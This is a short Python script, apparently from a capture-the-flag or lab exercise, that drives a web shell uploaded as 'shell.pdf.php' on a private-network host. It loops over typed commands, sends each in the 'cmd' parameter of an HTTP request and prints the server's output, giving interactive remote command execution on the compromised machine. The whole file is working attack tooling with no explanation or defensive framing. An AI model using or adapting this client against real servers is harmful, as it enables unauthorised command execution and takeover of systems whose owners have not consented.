import requests

url = 'http://10.10.19.188/cvs/shell.pdf.php/?cmd='
cmd = ''

while(cmd != 'exit'):
    cmd = input('command>')
    r = requests.get(url + cmd)
    print(r.text[5:-14], '\n')

